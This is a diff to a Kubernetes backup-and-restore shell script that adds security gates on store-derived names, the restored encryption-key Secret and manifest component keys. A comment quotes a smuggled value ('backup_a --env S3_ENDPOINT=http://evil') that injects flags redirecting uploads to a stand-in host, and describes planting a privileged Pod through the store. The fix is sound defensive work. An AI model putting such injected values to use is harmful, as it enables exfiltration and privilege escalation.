@@ -2401,6 +2401,20 @@ backup_clickhouse() {
         # location='remote' is REQUIRED, not cosmetic: the base must exist in the remote, and
         # system.backup_list also carries local-only rows. See DN-10.
         local prev_backup=$(ch_query "SELECT name FROM system.backup_list WHERE name LIKE 'backup_%' AND location='remote' ORDER BY created DESC LIMIT 1 FORMAT TabSeparatedRaw" 2>/dev/null || true)
+        # Store-derived, so gated exactly like MF_CH_NAME and the resolved backup id. Rows with
+        # location='remote' come from clickhouse-backup listing the bucket, so this name is
+        # whatever someone with write access to the ClickHouse prefix chose to call a directory
+        # — and it is spliced UNQUOTED into the clickhouse-backup action string below and into a
+        # single-quoted SQL literal the sidecar executes. A space is a legal S3 key character,
+        # so a name like `backup_a --env S3_ENDPOINT=http://evil` injects flags into the upload
+        # with no SQL breakout at all; an apostrophe (also legal) closes the literal outright.
+        # Falling back to a full upload is always safe — it costs bandwidth, never correctness.
+        case "${prev_backup}" in
+            *[!A-Za-z0-9_.-]*)
+                log "WARN" "[ClickHouse] Ignoring remote backup name '${prev_backup}': it contains characters outside A-Z a-z 0-9 _ . - and would be interpolated into the upload command"
+                log "WARN" "[ClickHouse]   Falling back to a FULL upload for this run."
+                prev_backup="" ;;
+        esac
         if [ -n "${prev_backup}" ]; then
             ch_upload_cmd="${ch_upload_cmd} --diff-from-remote=${prev_backup}"
             # Recorded in the manifest: this backup is NOT independently restorable, and the
@@ -3535,12 +3549,41 @@ restore_encryption_key() {
             log "INFO" "[EncryptionKey] Checksum verified ($(printf '%.16s' "${got_sha}")...)"
         fi
     fi
+    # THE gate. This is the only place in this file where content from the backup store is handed
+    # to the apiserver as a MANIFEST rather than as data, and everything else store-derived is
+    # charset-gated before it reaches an interpreter (the resolved id, MF_CH_NAME, MF_PG_DBS,
+    # the per-ordinal subdirs — DN-17/DN-35). Without this, anyone who can write the prefix could
+    # append a second document to this file — a privileged Pod, or a Secret overwriting any other
+    # in the namespace — and a routine DR restore would create it: `kubectl apply` runs as the
+    # backup SA, which holds pods:create and secrets:create/update/patch.
+    #
+    # The sha256 above is NOT that control: it is a corruption check whose expected value comes
+    # from the same store-written manifest, it is skipped entirely when the manifest records no
+    # sha256, and it is computed before the namespace rewrite so it never covers the applied bytes.
+    #
+    # backup_encryption_key writes this file as `kubectl get secret -o json | jq ...`, i.e. ONE
+    # JSON object, so `jq -e` both parses it natively and rejects a multi-document payload
+    # outright — a trailing second document is a parse error, not a second value.
+    if ! jq -e 'type == "object" and .kind == "Secret" and .apiVersion == "v1"
+                and .metadata.name == "pg-encryption-key"' "${tmp}" >/dev/null 2>&1; then
+        log "ERROR" "[EncryptionKey] The stored key object is not a single v1 Secret named 'pg-encryption-key'."
+        log "ERROR" "[EncryptionKey]   Refusing to apply it: this path creates whatever object the file describes,"
+        log "ERROR" "[EncryptionKey]   so anything else here would be an object someone put in the backup store."
+        rm -f "${tmp}"; return 1
+    fi
     # The exported Secret carries the SOURCE namespace in its metadata, so applying it into a
     # different namespace fails ("the namespace from the object does not match"). Rewrite it to
-    # the target namespace so the key is portable across namespaces (DR). Handles JSON + YAML.
-    sed -e 's/"namespace"[ ]*:[ ]*"[^"]*"/"namespace": "'"${NAMESPACE}"'"/' \
-        -e 's/^\([ ]*\)namespace:[ ]*.*/\1namespace: '"${NAMESPACE}"'/' \
-        "${tmp}" > "${tmp}.ns" 2>/dev/null && mv "${tmp}.ns" "${tmp}"
+    # the target namespace so the key is portable across namespaces (DR).
+    #
+    # With jq, not sed: the old `s/^\([ ]*\)namespace:[ ]*.*/` rewrote EVERY line that looked
+    # like a namespace field anywhere in the file, which for an injected second object obligingly
+    # retargeted it at the victim namespace too. jq changes exactly one field of the one object
+    # the gate above just proved this is.
+    if ! jq --arg ns "${NAMESPACE}" '.metadata.namespace = $ns' "${tmp}" > "${tmp}.ns" 2>/dev/null; then
+        log "ERROR" "[EncryptionKey] Could not set the target namespace on the key Secret"
+        rm -f "${tmp}" "${tmp}.ns"; return 1
+    fi
+    mv "${tmp}.ns" "${tmp}"
     if [ "${DRY_RUN}" = "true" ]; then log "INFO" "[EncryptionKey] [DRY RUN] kubectl apply -n ${NAMESPACE} -f <key from ${BACKUP_NAME}/encryption>"; rm -f "${tmp}"; return 0; fi
     if kubectl apply -f "${tmp}" -n "${NAMESPACE}" >> "${LOG_FILE}" 2>&1; then
         log "INFO" "[EncryptionKey] Restored"; rm -f "${tmp}"; return 0
@@ -4245,7 +4288,7 @@ ch_chain_required_names() {
 prune_expired_backups() {
     local ids cutoff now latest_id kept=0 expired=0 purged=0 attempted=0 skipped=0 id ts _owner="" _id_comps=""
     local _id_ch_pinned=false _purge_comps="" _partial_fail=0 _pruned_mf="" _ret_cut_h=""
-    local _id_mf="" _id_chname="" _comp_fail=0 _c=""
+    local _id_mf="" _id_chname="" _comp_fail=0 _c="" _ck="" _id_comps_ok=""
     local list_rc=0 started
 
     if [ "${BACKUP_RETENTION}" -lt 1 ]; then
@@ -4419,6 +4462,31 @@ prune_expired_backups() {
         # scary rclone error per miss, and burned the sweep's time budget on nothing.
         _id_mf=$(catalog_manifest "${id}" 2>/dev/null || true)
         _id_comps=$(printf '%s' "${_id_mf}" | jq -r '.components | keys[]' 2>/dev/null || true)
+        # Component keys come from the manifest, i.e. from the store, and each one becomes a
+        # path handed to store_delete_prefix (`rm -rf` on shared, `rclone purge` on s3). Gated
+        # like every other store-derived name in this file (src_subdir_for_ord, MF_CH_NAME).
+        # Not known to be exploitable — the trailing path segment is pinned to the validated
+        # backup id, and anyone who can write a manifest can already delete the data directly —
+        # but this is the file's one remaining store-derived value that reaches a destructive
+        # call ungated, and the rule here is that they all get the same treatment.
+        # Fed by a HERE-DOC, not a pipe, and NOT wrapped in $( ): `while read` on the right of a
+        # pipe runs in a subshell (so the filtered list would not survive, and neither would the
+        # warnings), and a `case` pattern's closing paren inside $( ) is a parse error in several
+        # shells. Same shape as src_subdir_for_ord, for the same reasons.
+        _id_comps_ok=""
+        while IFS= read -r _ck; do
+            [ -n "${_ck}" ] || continue
+            case "${_ck}" in
+                *[!A-Za-z0-9_.-]*)
+                    log "WARN" "[Retention] ${id}: ignoring manifest component key '${_ck}' (allowed: A-Z a-z 0-9 _ . -)"
+                    continue ;;
+            esac
+            _id_comps_ok="${_id_comps_ok}${_ck}
+"
+        done <<EOF
+${_id_comps}
+EOF
+        _id_comps="${_id_comps_ok}"
         if [ -z "${_id_comps}" ]; then
             # No usable manifest at purge time (it was readable during the ownership check, so
             # this is a transient read error or a concurrent change). Falling back to
